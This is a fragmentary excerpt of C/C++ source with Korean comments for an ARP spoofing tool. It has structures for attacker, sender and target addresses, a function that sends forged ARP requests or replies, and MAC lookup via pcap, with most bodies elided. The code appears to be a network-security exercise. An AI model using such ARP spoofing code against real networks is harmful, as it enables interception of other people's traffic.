...
// dev, attacker mac, ip는 const char 타입으로 선언
const char *dev;
const char *attacker_mac;
const char *attacker_ip;

// sender, target의 mac, ip를 관리하기 위한 구조체
struct attack_table
{
    char *sender_ip;
    char *sender_mac;
...
// attacker ip를 return하는 함수
char *get_my_ip(const char *ifr)
{
    int sockfd;
    struct ifreq ifrq;
...
void send_arp(const char *dev, int option, const char *destination_mac, const char *source_mac, const char *sender_mac, const char *sender_ip, const char *target_mac, const char *target_ip)
{
    ...
    // option 인자로 1이 넘어왔다면 Request, 2가 넘어왔다면 Reply
    if (option == 1)
...
char *get_mac(const char *dev, const char *attacker_mac, const char *attacker_ip, const char *sender_ip)
{
	...
	if( i == 50){
        ...
        // 브로드캐스트로 패킷을 전송하기 위해 FF:FF:FF:FF:FF:FF
        ...
        // pcap을 통해 캡쳐된 패킷의 sender ip가 내가 지정한 sender ip와 동일한지 체크
        // pacp을 통해 캡쳐된 패킷의 target_mac이 Attacker mac과 동일한지 체크
        if ((pcap_sender_ip == Ip(sender_ip)) && (!strcmp(attacker_mac, pcap_target_mac_str)))
        {
            // if문에 부합하다면, 내가 전송한 Request 패킷에 대응하는 Reply 패킷이다.
            pcap_close(pcap);
...
int main(int argc, char *argv[])
{
    ...
    for (int i = 0; i < table_count; i++)
    {
        free(attack_tables[i].sender_mac);
        free(attack_tables[i].target_mac);
    }
    delete[] attack_tables;
}
